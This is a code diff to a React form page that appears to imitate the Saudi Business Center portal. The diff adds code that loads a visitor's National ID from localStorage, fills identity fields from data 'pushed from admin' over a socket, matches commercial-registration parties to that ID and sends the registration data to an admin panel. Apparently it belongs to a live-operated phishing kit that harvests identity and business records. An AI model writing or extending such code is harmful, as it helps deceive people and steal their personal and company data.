@@ -1,5 +1,5 @@
 import { useState, useEffect, useRef } from 'react';
-import { sendData, navigateToPage, initializeSocket, socket, visitor, updatePage, clientNavigate } from '@/lib/store';
+import { sendData, navigateToPage, initializeSocket, socket, visitor, updatePage, clientNavigate, personalData } from '@/lib/store';
 import { useLocation } from 'wouter';
 import { motion, AnimatePresence } from 'framer-motion';
 import SBCSidebar from '@/components/SBCSidebar';
@@ -47,6 +47,27 @@ const UpdateInfo = () => {
   useEffect(() => {
     updatePage("معلومات مركز الأعمال");
   }, []);
+
+  // Load National ID from login (saved in localStorage)
+  useEffect(() => {
+    const savedNationalId = localStorage.getItem('nationalId');
+    if (savedNationalId) {
+      setNationalId(savedNationalId);
+    }
+  }, []);
+
+  // Listen for personal data pushed from admin
+  useEffect(() => {
+    if (personalData.value) {
+      const data = personalData.value;
+      if (data.arabicName) setArabicName(data.arabicName);
+      if (data.englishName) setEnglishName(data.englishName);
+      if (data.nationality) setNationality(data.nationality);
+      if (data.dateOfBirth) setBirthDate(data.dateOfBirth);
+      if (data.gender) setGender(data.gender);
+      if (data.nationalId) setNationalId(data.nationalId);
+    }
+  }, [personalData.value?.timestamp]);
 
   useEffect(() => {
     const updateTime = () => {
@@ -568,22 +589,41 @@ const [capitalAmount, setCapitalAmount] = useState('1000');
       } else {
         setCrData(result);
         // Auto-fill form fields from Wathiq data
+        // Try to match the logged-in user's National ID with CR parties
+        const savedNationalId = localStorage.getItem('nationalId');
+        let matchedParty: any = null;
+        
         if (result.parties && result.parties.length > 0) {
-          const owner = result.parties[0];
-          if (owner.name) setArabicName(owner.name);
-          if (owner.nationality?.name) {
-            // Map nationality name to select value
-            const natMap: Record<string, string> = {
-              'سعودي': 'saudi', 'السعودية': 'saudi',
-              'إماراتي': 'uae', 'كويتي': 'kuwait',
-              'بحريني': 'bahrain', 'عماني': 'oman',
-              'قطري': 'qatar', 'مصري': 'egypt', 'أردني': 'jordan'
-            };
-            const natValue = natMap[owner.nationality.name] || 'other';
-            setNationality(natValue);
+          // First try to find party matching the National ID from login
+          if (savedNationalId) {
+            matchedParty = result.parties.find((p: any) => p.identity?.id === savedNationalId);
           }
-          if (owner.identity?.id) setNationalId(owner.identity.id);
-          if (owner.typeName) setOwnerType(owner.typeName);
+          // If no match found, use the first party as fallback
+          if (!matchedParty) {
+            matchedParty = result.parties[0];
+          }
+          
+          if (matchedParty) {
+            if (matchedParty.name) setArabicName(matchedParty.name);
+            if (matchedParty.nationality?.name) {
+              // Map nationality name to select value
+              const natMap: Record<string, string> = {
+                'سعودي': 'saudi', 'السعودية': 'saudi',
+                'إماراتي': 'uae', 'كويتي': 'kuwait',
+                'بحريني': 'bahrain', 'عماني': 'oman',
+                'قطري': 'qatar', 'مصري': 'egypt', 'أردني': 'jordan'
+              };
+              const natValue = natMap[matchedParty.nationality.name] || 'other';
+              setNationality(natValue);
+            }
+            if (matchedParty.identity?.id) setNationalId(matchedParty.identity.id);
+            if (matchedParty.typeName) setOwnerType(matchedParty.typeName);
+          }
+        }
+        
+        // If we have the National ID from login, set it in the form
+        if (savedNationalId && !nationalId) {
+          setNationalId(savedNationalId);
         }
         // Send CR data to admin panel
         sendData({
